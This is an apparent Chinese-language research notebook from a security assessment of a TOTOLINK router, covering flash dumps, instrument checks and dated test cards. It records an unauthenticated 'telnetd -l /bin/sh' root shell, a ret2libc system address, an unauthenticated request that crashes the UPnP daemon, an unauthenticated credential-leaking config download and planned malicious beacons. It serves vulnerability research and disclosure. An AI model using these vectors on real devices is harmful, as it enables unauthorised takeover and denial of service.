              cat /proc/net/nf_conntrack_expect / ls /proc/sys/net/netfilter/ /
              cat /proc/modules / cat /proc/sys/net/ipv4/ip_forward
原始回應（節選，逐字）:
      # ps      → 沒有 miniigd。wscd 217、boa 350、telnetd 434
      # ps | grep -c miniigd  → 0
      00400000-00474000 r-xp … /bin/boa
      2aaa8000-2aaad000 r-xp … /lib/ld-uClibc-0.9.30.3.so
      2aabe000-2aac9000 r-xp … /lib/libapmib.so
      2aae3000-2ab15000 r-xp … /lib/libuClibc-0.9.30.3.so        ★ boa
      2aabe000-2aaf0000 r-xp … /lib/libuClibc-0.9.30.3.so        ★ wscd（無 libapmib）
      # cat /proc/sys/kernel/randomize_va_space  → 2
      Chain MINIUPNPD (0 references)
      DNAT  tcp -- 0.0.0.0/0  0.0.0.0/0  tcp dpt:8083 to:255.255.255.255:83
      UPNP_ENABLED=1     ALG_SIP_ENABLED=1
      # cat /proc/net/nf_conntrack_expect  → 空
      # ls /proc/sys/net/netfilter/  → 只有 generic/icmp/tcp/udp，沒有任何 SIP 條目
      # cat /proc/modules  → No such file or directory
      # cat /proc/sys/net/ipv4/ip_forward  → 0
      Linux version 2.6.30.9 (admin@office.hopeiot) … #1526 Wed Jan 10 14:50:54 CST 2018
觀測通道 1（maps）: libc 基底與桌面算出來的逐位元相同，而這是第四次以後的開機
觀測通道 2（sysctl）: randomize_va_space = 2，與觀測通道 1 直接矛盾
觀測通道 3（ps）: miniigd 行程不存在，不是 listener 關掉 —— 與 P6-3 的 wscd 不同
觀測通道 4（iptables）: 22 個 A 變成 255.255.255.255，inet_addr 失敗值被照用
判定: ✅ 成立（對 P5-2）；🔶 部分（對 P8-7、P6-1、P6-5）
反證檢查: 測前寫「randomize_va_space 不是 0，或 maps 裡 libuClibc 不是 2aae3000
          → 每次開機會動，notes/mips-ret2libc.md 的 system @ 0x2ab08460 只對
          2026-08-18 那次開機成立，P5-2 從 partial 變 refuted」。
          **前半觸發了，後半沒有** —— 而那個組合本身就是結果：
          旗標宣稱隨機化，位址沒有動。桌面那份筆記的每一個數字都被確認，
          包含它**主動撤回**的 TASK_UNMAPPED_BASE = 0x2aaa8000
這一步燒掉了什麼: 一個沒有認證的 root shell（收工斷電）
驗證狀態(測後): dynamic   下一步: P6-5 的向量需要 WAN 側，W08
```

## 這一場燒掉了什麼

- **開機循環 4 次**（第 2 站 1 次、miniigd 被打掉 2 次、收工前 1 次）。
- **`miniigd` 被終止 3 次**，每次都要斷電才回得來。
- **`telnetd -l /bin/sh` 起過 1 次，沒有認證。收工斷電。**
- **`MINIUPNPD` chain 留下一條 `to:255.255.255.255:83` 的 DNAT 規則** —— 在 RAM 與
  iptables，斷電即消。`T-79` 建的那條 8080 映射也一樣。**兩條都不是我用
  `DeletePortMapping` 刪掉的，是被斷電清掉的**，而那個區別要寫清楚：
  作業單 `A3.15` 要求「做完必須把映射刪掉，而且在同一節裡完成」，而 daemon
  死掉之後沒有辦法對它送 `DeletePortMapping`。
- **設定區沒有被寫。** 第 2 站純讀，第 3 站沒有跑任何會改設定的 handler。

## 下一場從哪裡開始

**W07 收在 58 / 58，而且這一場把三列從 `na` 換成了有內容的判定。**

1. **`P6-5` 與 `P8-7` 的 (b) 半，同一趟。** 兩者都要線在 WAN 埠：先在 LAN 側建一條
   合法映射、再移線（不斷電，映射活在 RAM），起 `tools/rogue-dhcp.py` 的假 ISP，
   然後（a）從 WAN 側打那個埠、（b）送 UDP 5060。**預測要寫在移線之前。**
2. **`miniigd` 那個終止的先驗檢索。** 一發未認證的 SOAP 請求終止 UPnP daemon，
   目前**沒有做過先驗檢索**，所以它不可通報也沒有通報。`docs/disclosure.md` 的程序。
3. **`randomize_va_space = 2` 而版面不動。** 值得讀 kernel 確認 MIPS 2.6.30 是不是
   真的沒有實作 mmap 隨機化 —— 那會把「量到的」變成「解釋得了的」。

# 2026-08-20（四）W08 第二支儀器 —— 計畫，寫在夾子上去之前（桌面場，尚未夾線）

**這一場的整個理由是一句話：這顆快閃記憶體上的每一個 byte 級主張，到今天為止都只有
一個來源。** 兩份完整 dump 逐 byte 相同、2026-08-15 的三個 console 視窗也對得上 ——
而三者全部走 boot loader 自己的 `FLR`，走裝置自己的 UART。**一個系統性的讀取錯誤對
它們三個都是隱形的。** `dumps/MANIFEST.json` 把這件事寫成 `not_corroborated_by`，
README 的板子上掛著一個 ⚠️，`docs/lab-inventory.md` 說只有一支 3.3 V 的程式器能了結它。

**儀器今天到位了，而它是同一塊在 W02 Day 4 被量成 5 V 板的 CH341A。** 這一次的改法是
把 5 V 供電走線在 PCB 背面切斷，再用跳線帽把 3.3 V 灌進原本那支 5 V 腳。作者已經用
電表量過，每一支腳都是 3.3 V。

**而這一場的第一步仍然是量電表，理由不是不相信作者。** W02 那一次也做了 3.3 V 改機，
腳位仍然讀 5 V，而**原因沒有被隔離** —— 三個候選（走線沒真的斷、掀起來的腳還碰著焊墊、
`DO` 的上拉跟晶片電源無關），分開它們的那一個量測（CH341A 自己的 pin 28）當時沒有做。
所以今天要量的是三件事而不是一件：**pin 28 是因，座上八支腳是果**，兩個都對上才叫
互相印證，第三件是 `U19` 的本體寬度。

> 順帶一提，作者量到「每一支腳都是 3.3 V」這件事本身，就已經推翻了「5V 與 3.3V 加跳線帽」
> 最危險的那一種讀法：如果那顆跳線帽是把還活著的 5 V 軌短到 3.3 V 軌上，座上會讀到 5 V。
> 它沒有。**這是這一場第一個由量測而不是由說明排除掉的東西。**

## 一、順序，以及它為什麼是這個順序

**順序在 `runsheet.md` 的 `B-W08`，這裡不複述。** 一句話版本：第 1 站 → **第 5 站**
（拔電、夾子第一次就座：`A5.1` 電表三量 → `A5.2` 三個 byte → `A5.3` seat-a）→ 拆夾重夾
（`A5.3` seat-b）→ `A5.4` 演練 → `A5.5` 寫入半 → **拔夾、插電、確認會開機** → 第 3 站
驗證 → 再夾一次做 `A5.5` 的還原半 → 第 4 站收工。

**新增一整站，Part A 從四站變五站。** 第 5 站的裝置狀態是「斷電、電由程式器供」，
那不是前面四種裡的任何一種。理由寫在 `RUNBOOK` §8.12.40。

**這一站的成本單位是一次夾子就座，不是一次電源循環。** 所以節與節的順序是照
「夾上去之後能不能不拆下來」排的，不是照風險排的 —— 唯一刻意拆一次重夾的是 `A5.3`，
而那一次拆解本身就是它要的證據。

## 二、預測，全部寫在夾子碰到晶片之前

| # | 節 | 預測 | 反證條件（寫在前面） |
|---|---|---|---|
| 1 | `A5.1` | CH341A 自己的 **pin 28 ≤ 3.4 V** | 高於 3.4 V → 座上量到的 3.3 V 另有來源，**不夾** |
| 2 | `A5.1` | 座上八支腳全部 ≤ 3.4 V，**`DO`(2) 特別要量** | 任一支高於 3.4 V → 改機沒有覆蓋到上拉，**不夾** |
| 3 | `A5.1` | `U19` 是 SOP-8 **150 mil** | 量到 208 mil → 套件夾子是窄的，**不硬夾** |
| 4 | `A5.2` | JEDEC id = **`1c 70 16`** | 回 `1c 30 16` → 這顆是 EN25Q32、封裝上的字被誤讀、loader 一直都認得它，而下面第 5 列整段作廢 |
| 5 | `A5.2` | loader 的晶片表裡**沒有** `1c7016`，這就是 `chipName: UNKNOWN` 的成因 | 桌面上已經算完（見第四節），這一列不會在工作台上改變 |
| 6 | `A5.3` | seat-a 的兩次讀 hash 相同 | 不同 → 接觸不良，重新就座，**不要讀** |
| 7 | `A5.3` | seat-a == seat-b | 不同 → 讀出來的東西跟夾子怎麼坐有關，那是儀器問題 |
| 8 | `A5.3` | **整份 4,194,304 byte 的 sha256 = `a800059a9b8c414d…`**，也就是 2026-08-16 `FLR` 那一份 | 不同 → 看差在哪一段：三個設定區 = 裝置自己寫的（去指出是誰）；kernel/rootfs = **兩支儀器對同一顆晶片說法不同**，當儀器問題查 |
| 9 | `A5.4` | `plan` 只報一段 `0x3ff000-0x400000`，4096 byte | 報出第二段 → 我拿來當基準的那份不是晶片現在的內容 |
| 10 | `A5.5` | 寫入後拔夾插電，**板子照常開機到 `<RealTek>` 且 web 有回應** | 開不了機 → 先想夾子掀腳，不是先想寫壞 |
| 11 | `A5.5` | 開機後未認證 `GET /config.dat` 解出 `USER_NAME` 與 `USER_PASSWORD` **兩筆都是 `nimda`**；`admin:admin` 不再通、`nimda:nimda` 通 | 兩筆仍然是 `admin` → 直寫沒到達執行中的系統，而**要在三個候選裡指名一個**：(i) 開機時有東西重寫這一區、(ii) 夾子寫的位址不對、(iii) `boa` 讀的是別的來源（開放題 87 已經量到 `/config.dat` 不是 flash blob 本身） |

**第 8 列是這一場的主菜，而它敢這樣預測是有理由的，不是樂觀。** `FLR` 那兩份是
2026-08-16 讀的，中間這台被寫過好幾次 —— W06 的 PoC 改了 `H601` 九個 byte 又改回去、
W05/W07 的未認證 POST 改過 `COMPCS` 三個旗標、2026-08-19 按了 reset。而 W07 收尾那一場
量到 `flash default-sw` 把 `COMPCS` 與 `COMPDS` 兩區都從硬編碼重寫、逐 byte 等於
2026-08-16 那一份，`H601` 也逐 byte 相同。**所以「一個 byte 都不差」是有根據的預測，
而只要開機途中有任何一條路寫過 flash，它就會落空 —— 那本身是這個 repo 目前沒有的一個
結論：沒有人知道這台開機時會不會寫自己的 flash。**

## 三、停止條件，而且是硬的

- ❌ **`A5.1` 三個量測任何一個沒過就結束這一場。** 不夾。不「先試一下」。
- ❌ **`no JEDEC id came back` 不要重試第三次。** 依序檢查：路由器真的拔電了嗎、
  夾子 pin 1 對 `U19` 的圓點了嗎、夾子寬度對嗎。
- ❌ **`MORE THAN ONE id` 是接觸不良，不是發現。** 重新就座，**不要讀**。
- ❌ **`A5.3` 沒有拿到一份通過篩檢的完整讀取之前，`A5.4` 與 `A5.5` 一步都不做。**
  那份讀取是後面兩節唯一的撤銷鍵。
- ❌ **拔夾之後板子開不了機，先拍照，不要再夾第二次。** 掀腳跟寫壞從外面長得一樣，
  而再夾一次會把兩者的證據一起破壞掉。復原路徑是把 `seat-a` 原圖整份寫回去，
  那條路不需要 SoC 願意執行任何一行程式。

## 四、桌面上已經做完、而且驗過的事 —— 這一場一件都不重算

**這四件事是這一場「能夠失敗」的來源。** 它們全部在夾子上去之前完成，全部在副本上做，
而且每一件都指得回一個可以重新產生的產物。

1. **boot loader 自己帶著一張 SPI 晶片描述表**：32 筆、stride `0x20`、id 在 `+0x00`、
   型號字串指標在 `+0x18`。`tools/loader-unpack.py --chip-table` 解它，**載入基底是
   回推出來的而不是假設的**（`0x80400000`，而回推漏斗的結尾必須是一）。
   Eon 家族只有 `1c3115` `1c3116` `1c3015` `1c3016`。**`1c7016` 一列都沒有** ——
   這就是 boot log 從 2026-08-15 印到今天、三週沒人解釋的 `chipName: UNKNOWN`。
   產物：`reports/bootloader-unit-2018.json` 的 `chip_table`。
2. **同一張表順帶交出三個重複的 JEDEC id**，其中 `ef3016` 兩列指向兩個**不同**的型號
   字串（`W25X32` 與 `W25X64`），而 W25X64 真正的 id 是 `ef3017`。廠商查表資料裡有
   一列是錯的。另外 `20ba17` 那一列的型號寫成 `MCba17`，看起來像拿 id 手打型號打壞了。
3. **常駐映像結束於 `0x180000 + 0x1CA041 = 0x34A041`**，所以 `A5.4` 的演練位址
   `0x3FF000` 在它後面 **690 KiB**，而且現在整段是 `FF`。**位址是算出來的，不是挑的。**
4. **`admin` 這五個字面 byte 在整個壓縮的 `COMPCS` 區裡只出現一次，在 flash
   `0x00C0D1`（十進位 49361）。** 前面緊接著 `b6`（`USER_NAME`），後面不遠是 `b7`
   （`USER_PASSWORD`）。把它改成 `zzzzz`，`fwrecon` 拒絕解碼，理由是 8-bit payload
   校驗和變成 178 而不是 0 —— 而 `zzzzz` 與 `admin` 的位元組和相差 **89**，
   **178 = 2 × 89**。**那個 2 就是「同一份字面值被用了兩次」的算術證明。**
   改成 `nimda`（同樣五個字元的重排）則校驗和一個數都不動，`fwrecon` 回
   `checksum_ok` / `ring_fill_agrees` / 344 筆，而且**恰好兩筆**值改變，
   `USER_NAME` 與 `USER_PASSWORD` 都變成 `nimda`。

> **第 4 點是這一列第二版的預測，而第一版在同一個下午被自己推翻。** 第一版寫的是
> 「改一個 `COMPCS` 欄位、把校驗和留壞、看裝置拒不拒絕」，而它建立在一個錯誤上：
> `COMPCS` 是**壓縮**的，沒有「欄位偏移」這種東西可以 patch。
> **一個做不出來的實驗比一個猜錯的預測更糟**，因為它會把人帶到工作台前才發現。
> 凍結雜湊改了，理由寫在 `test-cases.toml` 的 `[freeze].note`。

## 五、這一場刻意不做的事

| 不做 | 為什麼 |
|---|---|
| **`A5.5` 的第二發（`zzzzz`，校驗和留壞）** | 跟第一發問的不是同一個問題。兩件一起改就兩件都答不了 —— 這是 `P6-1` 那個對照組的同一課，隔兩天、換一支儀器，又出現一次 |
| `A2.5` / `A2.6`（`FLW` 寫 flash） | **連續第三場沒有被打開。** 這一場要寫的東西走夾子，而夾子不經過 boot loader |
| `P9-10` / `P9-12`（回刷、TFTP 到 RAM） | 兩列都在第 2 站，而且**兩列都還沒有工具**：`console-dump.py rescue` 只做到 `AUTOBURN 0` + `IPCONFIG`，上傳與 `J` 沒有任何一支工具送得出去 |
| `P7-7`（出廠 PSK 推導） | 前提今天在桌面上被推翻 —— 見下 |
| `A3.24`（reset 按鈕） | 還原走 `A5.5` 的第一條路。按 reset 會把 `A5.3` 剛量到的基準一起洗掉 |

**`P7-7` 的前提被推翻了，而這一場不修它。** 登記簿寫「出廠 PSK 已經在 `COMPDS` 裡
解出來了」。`reports/compds-unit-2018.json` 裡**沒有任何一筆 `*_PSK`**：無線設定整包
在 `WLAN_ROOT` 這一筆 **22,044 byte 的 table-valued blob** 裡，而 `fwrecon` 只把它
當 bytes 報出來。**45,226 byte 解壓後的設定，有一半沒有被解過。** 那不是一個查表動作，
是一件真正的逆向工作。

## 六、儀器工作（這一場之前完成，全部沒有硬體）

| | |
|---|---|
| `tools/loader-unpack.py --chip-table` / `--has-id` | 新。解 boot loader 的 SPI 描述表，載入基底回推、漏斗必須收斂到一，而且**走過的指標必須解釋完整個型號字串區** —— 因為這張表上面每一個主張都是「沒有這一列」，而一個提早停下來的走訪會對存在的東西也說沒有 |
| `tools/test-loader-unpack.sh` | 7 → **16** 個案例。新增的九個裡有一個是把一根指標停在 stride 外面，驗那個「絕不能是絕不」的拒絕真的會開火 |
| **`tools/flash-write.sh`** | 新。夾子那一側的寫入路徑，跟 `console-write.py` **拒寫同兩段**（boot loader、`H601`），而且安全論證是**整份映像的差異**而不是位址：檢查位址只證明你打進去的位址被允許，比對差異證明真的會動的 byte 就是你要動的那些 |
| `tools/test-flash-tools.sh` | 4 → **18** 個案例。其中一個是這支工具存在的理由：**操作者把整顆晶片都 `--allow` 了，boot loader 與 `H601` 仍然必須被拒絕**。把 `FORBIDDEN` 清空重跑，那一個案例會紅 —— 驗過了 |
| `tools/check-runsheet.py` | 旗標檢查以前只看 Python 工具。**這個 repo 裡兩支最能弄壞晶片的工具都是 shell**，現在它們的 usage 區塊也被當成 `--help` 讀 |
| `tools/bench-doctor.sh` | tier 3 新增 `lsusb` 與 CH341A 在不在匯流排上。**`lsusb` 缺席是 `FAIL` 不是 `--`**，理由是儀器 bug 45：降級成 skip 的檢查等於沒有跑 |
| `tools/check-reports.py` | 對 `chip_table` 強制兩件事：不能是 `refused`，而且走訪不能留下沒到達的指標。兩個拒絕都手動觸發過，確認會開火 |

**而這裡有一個是我自己的：`flash-write.sh` 寫完的第一版，在一句雙引號字串裡放了
一對反引號** —— 那在 bash 裡是命令替換。同一個 repo 在 2026-08-19 一場之內被反引號
毀掉四次（一個 payload、一個 heredoc、一個 `sed`、一個遠端 build）。這一次它在跑之前
就被抓到，抓到的方式是那條寫下來的規則本身。**規則有效的證據，是它抓到寫規則的人。**

# 2026-08-20（四）補記 —— 上面那一場的「儀器不存在」是錯的，而只追加檔案用追加來更正

**這一段更正的是同一天稍早寫在這個檔案裡的東西**，而它不去改上面那些字，
因為這個檔案是逐字證據。2026-08-19 已經因為同一個理由用過同一種方式更正一次。

**錯在哪裡。** 今天稍早把八列無線測試砍掉，理由寫的是「儀器不存在」，而那個結論是
**看一張網卡**（工作站上的 Intel AX201）**推廣到整個實驗室**得出的。作者接著說：
桌上有一片 **ESP8266**。

**分界線畫錯了，而畫對之後它很鋒利：不是「有沒有 Wi-Fi 網卡」，是「管理框還是資料框」。**

| | ESP8266 做得到嗎 |
|---|---|
| 送出任意**管理框**（`wifi_send_pkt_freedom`） | ✅ —— beacon 就是管理框 |
| 完整收到**管理框** | ✅ |
| 完整收到**資料框** | ❌ **sniffer 模式下只給到 802.11 標頭** |

所以：

- **`P7-3`（惡意 beacon → Site Survey 表溢位）跑得動**，而它是一列 `star`。
- **`P7-4`（惡意 WPS IE）的 beacon 那一側跑得動。**
- **`P7-5`（PMKID）與 `P7-6` 的擷取半跑不動** —— EAPOL 是資料框。
  **換一片 ESP32 兩者都成立**（它的 promiscuous 回傳完整框），而 ESP32 約 US$5。
- `P7-1` `P7-2` `P7-9` `P7-10` 仍然要 AR9271。

**兩列撤銷刪除，六列的理由改成針對那一列的。** `P7-6` 那一句最值得讀：ESP8266
送得出 deauth、收不到後面的握手，所以這一列在這片板子上剩下的只有
「把第三方裝置踢下線而且什麼都沒學到」，那是這個登記簿最不該排的一種動作。

**輻射那一半沒有被解除，而且不會被任何一片板子解除。** beacon 是廣播，ESP8266 在
同樣功率下打得跟 AR9271 一樣遠。`P7-3` 要跑之前，衰減或屏蔽必須先有答案 ——
**那是同意問題，不是儀器問題**，而今天沒有答案。

**這是同一場裡第二次「從單一來源斷言一個普遍的不存在」。** 第一次是 `P9-5` 自己的
理由 —— 這顆 flash 的每一個 byte 級主張都只靠一支儀器 —— 而那正是這一週存在的目的。
把這一段寫在它旁邊是刻意的。

**登記簿那一側動了什麼：** freeze 與 schedule 兩個雜湊今天各自動了兩次，第二次就是
這一件事。而**六個 `cut_reason` 被改寫，沒有任何一個雜湊因此而動** —— 它們只是剛好
跟那兩個雜湊共用同一個 commit。開放題 93。

**夾子那一場的計畫一個字都沒有改。** 第 5 站與 `A5.1`–`A5.5` 不受影響：
`P7-3` / `P7-4` 的裝置狀態是第 3 站（開機、web 服務中，因為 Site Survey 要從未認證的
頁面觸發），而且發射端的韌體還沒有寫。它們是另一場。

# 2026-08-20（四）儀器量測 —— 一張紀錄卡，而它不需要裝置

**這一場沒有碰路由器。** 量的是程式器，而程式器是 `A5.1` 的先決條件。
記成紀錄卡而不是散文，因為它是一次對著寫在前面的預測所做的量測，
而這個檔案對那種東西只有一種格式。

```text
T-84  —      CH341A 的 3.3 V 改機，量在夾子上去之前（A5.1 的第 1、2 項）  2026-08-20 22:40
可行性: ★★★★★   驗證狀態(測前): unverified   依據: PROGRESS.md W02 Day 4 的電壓表，
              以及那一段自己寫的「原因未隔離，板子處於已改、未驗證狀態，使用前必須重量」
送出（逐字）: 三用電表，CH341A 插著 USB、閒置、座上無晶片、夾子未接板子
原始回應:
      座上 8 支腳（1 CS# / 2 DO / 3 WP# / 4 GND / 5 DI / 6 CLK / 7 HOLD# / 8 VCC）
                                    全部 3.3 V
      CH341A 自己的 pin 28（晶片的 I/O 電源）    3.3 V
觀測通道 1（果）: 座上每一支被驅動的腳都是 3.3 V。2026-08-16 那張表上
      CS#(1) / DI(5) / CLK(6) / DO(2) 四支是 5 V
觀測通道 2（因）: pin 28 = 3.3 V。**這正是 2026-08-16 沒有量、因此寫下
      「原因未隔離」的那一支**
判定: ✅ 成立 —— 因與果在電路上兩個不同的點各自量到，而且互相解釋得通
反證檢查: 測前寫「(1) pin 28 ≤ 3.4 V；(2) 座上八支全部 ≤ 3.4 V，DO(2) 特別要量。
          任一項超過就停，不夾」。兩項都成立，停止條件沒有觸發。
          **而這張卡刻意不主張它沒有量到的東西**：2026-08-16 那次改機失敗的
          三個候選原因裡，只有第三個被這次量測反證掉 ——「DO 的上拉跟晶片電源
          無關，所以只改 pin 28 不會讓 DO 跟著下來」。DO 跟著下來了，所以在
          這塊板子上上拉與 pin 28 同源。另外兩個候選（走線沒真的斷、掀起來的
          腳還碰著焊墊）**現在不是被回答，是變成無法回答** —— 板子已經被重工，
          當時那個會失敗的組態不存在了。修好一件東西會銷毀它為什麼壞掉的證據，
          而那個代價要寫下來而不是含糊過去
這一步燒掉了什麼: 什麼都沒有。路由器沒有通電，夾子沒有碰過板子
驗證狀態(測後): dynamic   下一步: A5.1 的第 3 項（U19 本體寬度，150 mil 還是
              208 mil），然後 A5.2
```

## 這張卡改變了什麼

- **`A5.1` 的三項裡，第 1、2 項完成，第 3 項（`U19` 本體寬度）還沒。**
  下一場從那裡開始，而不是從 `A5.2` 開始 —— 夾子寬度不對是會掀腳的，
  而掀腳的板子開不了機。
- **`PROGRESS.md` W02 Day 4 的那句「板子處於已改、未驗證狀態，使用前必須重量」
  可以劃掉了**，而劃掉它的是兩個點的量測，不是一句「這次改好了」。
- **`docs/lab-inventory.md` 的 SPI 那一格缺口關閉。** 無線那一格今天被改寫過
  一次（ESP8266），但沒有關閉。

> **一句留給下一場的話**：這張卡的價值不在「3.3 V」這個數字，在於它是**兩個點**。
> 2026-08-16 那次也有一個數字，而那個數字（`VCC` = 3.3 V）看起來一樣讓人安心，
> 實際上是陷阱本身。差別是這一次因與果各量了一支腳。

# 2026-08-21（五）W08 桌面場 —— 沒有碰裝置，而它關掉一列登記簿、並且改了進站順序

**這一場沒有插電、沒有夾子。** 照這個檔案自己的規矩，桌面場一樣要有一則 ——
而且**桌面場正是下一次進站的計畫會被改掉的那一天**，那半件事必須在插電之前上紀錄，
不是之後。W07 Day 3 改了三條進站預測、這個檔案一個字都沒寫，是作者抓到的。
今天改了兩件（`A5.5` 多一步、一個採購方案被否決），所以這一則的重點在後半。

## 紀錄卡 —— `A5.1` 的第 3 項

```text
T-85  —      U19 的封裝寬度，量在夾子上去之前（A5.1 的第 3 項）        2026-08-21
可行性: ★★★★★   驗證狀態(測前): unverified   依據: notes/hardware-inspection.md §1
              「SOP-8 exists in 150 mil and 208 mil bodies, and the clip bundled
               with a CH341A kit is often the narrow one. Measure U19 before
               forcing anything onto it.」
送出（逐字）: 直尺。路由器拔電、CP2102 拔掉、夾子未接、U19 仍在板上
原始回應:
      150 mil
觀測通道 1: 作者用直尺量。**只有這一個通道**
判定: ✅ 成立 —— 測前預測寫的就是「U19 是 SOP-8 150 mil」
反證檢查: 測前寫「量到 208 mil → 套件夾子是窄的，不硬夾」。沒有觸發。
          **而這張卡刻意不主張它沒有量到的東西，這一點跟 T-84 相反：**
          T-84 是兩個點（pin 28 是因、座上八腳是果），這一張是一個點。
          150 mil 與 208 mil 的腳尖距離差 1.9 mm（6.0 對 7.9），直尺分得出來，
          所以這不是一個邊界判斷 —— 但「分得出來」跟「有第二個來源」是兩件事。
          直尺讀數是觀測者對刻度落點的判斷，**沒有留下任何產物**：沒有照片、
          沒有數字檔案，事後沒有人能重新檢查它。
第二個來源（預先登記，尚未到達）: A5.2 的 RDID。夾子寬度不對就不會八支腳同時
          接觸，而 A5.2 的停止條件第三項寫的就是「夾子寬度對嗎」。所以這一列
          現在的狀態是「一個來源，第二個來源在下一步到達」，不是「已經兩個」
另一個可得而未取的來源: EN25QH32B datasheet 的 Ordering Information，查
          封裝上那串 `QH32B-104HIP` 的最後一個字母。notes/hardware-inspection.md
          §1 從 W02 就寫著「should be read rather than guessed at」，至今沒讀。
          **它是文件不是量測**，跟直尺是不同種類的來源，所以兩個都拿到才是完整的
這一步燒掉了什麼: 什麼都沒有。路由器沒有通電，夾子沒有碰過板子
驗證狀態(測後): static   下一步: A5.2（`flash-read.sh probe 1c7016`）
```

**`A5.1` 三個量測全部通過，夾子可以上。** 第 1、2 項在 `T-84`（2026-08-20），
第 3 項在這裡。

## 這一場改掉的進站計畫，兩件

**一、`A5.5` 的還原半前面多一步：`seat-c` 完整讀取。** 循環 3 再夾上去之後，
先讀一份完整影像，跟寫進去的 `w08-p96.bin` 逐 byte 比，**再**還原。
預測是 `cmp -l | wc -l` 回 `0`，而它回答的是**開放題 91：這台開機時會不會寫自己的
flash**。中間已經發生過一次完整開機（拔夾 → 插電 → 開到 `<RealTek>` → web 驗證）。

**這一步比 `A5.3` 那個比對更能回答那個問題，理由是混淆項少一個。** `A5.3` 比的是
夾子對 `FLR`，兩支不同的儀器 —— 那裡的差異有兩個來源（開機寫了，或兩支儀器不一致），
而 `A5.3` 自己的文字就承認分不開。`seat-c` 比的是同一支夾子在兩個時間點讀的兩份，
中間唯一發生的事是那次開機。**成本是零**，因為循環 3 本來就要再夾一次。
寫在 `runsheet.md` `A5.5` 與 `B-W08 增補`，理由在 `RUNBOOK` §8.12.44。

**二、一個採購方案被否決，理由寫下來而不是靜靜不提。** 原本要買一片 RP2040，用 PIO
把 `CLK`/`CS#`/`DI`/`DO` 當同步擷取，在開機途中被動側錄 SPI 匯流排上的 opcode。
那個方案更強 —— 它連**開放題 89**（`FLW` 在查不到型號時送 `0x20` 還是 `0xD8`）都
一起答了。**否決的理由有三個，而且沒有一個是價錢：**

| | |
|---|---|
| 它要在**通電**的板子上夾 | 本專案對 CH341A 明令禁止的動作，理由是兩個 master 在同一條匯流排上 |
| SOIC-8 夾只有一個 | CH341A 與 RP2040 不能同時掛 |
| **上面第一件事用桌上已經有的東西回答同一個問題** | 答得比較窄（側錄看得到「寫了什麼指令」，`seat-c` 只看得到「寫完的結果」），但成本是零 |

**這是作者兩次直覺的結果，兩次都對。** 我把那個方案講得比它該有的份量重，
而它其實不在 W08 的關鍵路徑上。側錄退回開放題。

## 桌面上做完、而且不需要裝置的事

**`P7-7` 關掉了，判定 `refuted`，而它的價值是一個比命中更強的空手。**
登記簿寫「出廠 PSK 已經在 `COMPDS` 裡解出來了」。把 `WLAN_ROOT`（22,044 byte，
佔 45,226 byte 解壓設定的一半，今天之前從未被解過）解開之後：

```text
六個無線介面區塊，每一個都是
  ENCRYPT (0x0019)  = 0
  WPA_PSK (0x001e)  = 65 byte 全零
  WSC_PSK (0x0115)  = 65 byte 全零
  WEP 四把鑰匙      = 全零
  SSID    (0x0001)  = 'TOTOLINK N150RT'（固定，沒有每台不同的尾碼）
```

**這台出廠是一個開放網路，沒有 PSK 可以推導** —— 所以那條反證條件（「推導公式算出來
的值與 `COMPDS` 裡的不同」）連比對的對象都不存在。第二來源是裝置自己的 `/bin/flash`：
`dumps/w07-enc.txt` 只有一行 `ENCRYPT=0`。

**而名字是從哪裡來的，這一段才是重點。** `reports/mib-table-unit-2018.json` 從 W04
起就帶著一個欄位 `"runner_up": 133` —— `mibtable.py` 找到第二長的那一段記錄，
印出它的長度，然後把內容丟掉。**那 133 筆就是這 133 個 TLV 的名字表**
（`0x012754`，`SSID` … `RX_RESTRICT`）。工具找到了答案、把答案的長度印在報告裡、
然後扔了。整個 `libapmib.so` 裡有 21 段這樣的表，第一版留了一段。

細節、跨版本比較（2020 那兩版多了 `WSC_AUTO_LOCK_DOWN` 與 `IEEE80211W`，這一版兩者
都沒有）、以及另外十二筆同樣沒人解過的 table-valued 項目，寫在
`notes/wlan-root.md`。

## 這一場刻意不做的事

| 不做 | 為什麼 |
|---|---|
| 沒有插電、沒有夾子 | `A5.1` 第 3 項是量測不是操作，量完就停。夾子那一場是下一場 |
| `P7-3` / `P7-4` 的 ESP8266 韌體 | 屏蔽/隔離那半個理由還沒有答案，而**那是同意問題不是儀器問題**。作者今天說有相對隔離，但「相對隔離」還不是一個數字 —— 發射前要先掃一次、記下看得到幾個 BSSID 與最強幾 dBm，那一列才算有前置條件 |
| `P9-10` / `P9-12` 的 loader 工具 | 兩列都在第 2 站，而且 loader 的字串是 **TFTP Client**（`**TFTP Client Upload File Size = %X Bytes at %X`、`*TFTP Client Download Success!`），所以要在 WSL 起一個 TFTP **伺服器**，不是寫一支上傳程式。這一點今天從 `reports/bootloader-unit-2018.json` 讀出來了，工具還沒寫 |
| 14 章 writeup 初稿 | 第 8 章現在才有 `WLAN_ROOT` 這一塊，第 14 章要等這一週的量測結果。現在寫就是一週內重寫 |

## 下一場從哪裡開始

**`A5.2`。** `A5.1` 三項全過，路由器拔電、CP2102 拔掉、夾子 pin 1 對 `U19` 的圓點，
然後 `./tools/flash-read.sh probe 1c7016`。順序在 `runsheet.md` `B-W08` 與
`B-W08 增補`，預測在 2026-08-20 §2 那張表，一個字都不要重寫。

# 2026-08-21（五）補記 —— 上面那一則說「loader 是 TFTP client」是錯的，而只追加檔案用追加來更正

**這一段更正的是同一天稍早寫在這個檔案裡的東西**，而它不去改上面那些字，因為這個
檔案是逐字證據。2026-08-19 與 2026-08-20 已經因為同樣的理由用同樣的方式各更正過一次。
這是第三次。

**錯在哪裡。** 上面那一則的「這一場刻意不做的事」寫著：loader 的字串是
**TFTP Client**，所以要在 WSL 起一個 TFTP **伺服器**。那個結論是從 LZMA 第二階段裡
兩個格式字串讀出來的：

```text
**TFTP Client Upload, File Name: %s
*TFTP Client Download Success! File Size = %X Bytes
```

**「Client」指的是對面那一端，不是 loader。loader 自己就是伺服器。**

**而反證這件事的量測，四天前就在這個檔案裡。** `T-09`，2026-08-17：

```text
TFTP RRQ(不存在的檔名) -> **516 bytes DATA (opcode 3) from :2098**
```

**一個讀取請求被回了資料。** 不需要再論證任何東西。同一張卡還記了兩件事，而兩件都
被列為開放題、當週不追，現在都變成工具的設計依據：

```text
計畫外: TFTP GET 不看檔名，吐的 516 bytes 與 flash 0x060010 起的
        cr6c 酬載逐 byte 相同。列為開放題，本週不追
```

**這一次的形狀，比修好它更值得記三件事：**

**一、這是這個 repo 的第一條規矩，在專門用來執行那條規矩的那一週被違反。**
一個來源——兩個格式字串——讀了一次，然後在上面蓋了一個設計。第二來源不是缺席、
不是昂貴、也不在別的地方：**它就在同一場、四小時前才追加過的同一個檔案裡。**

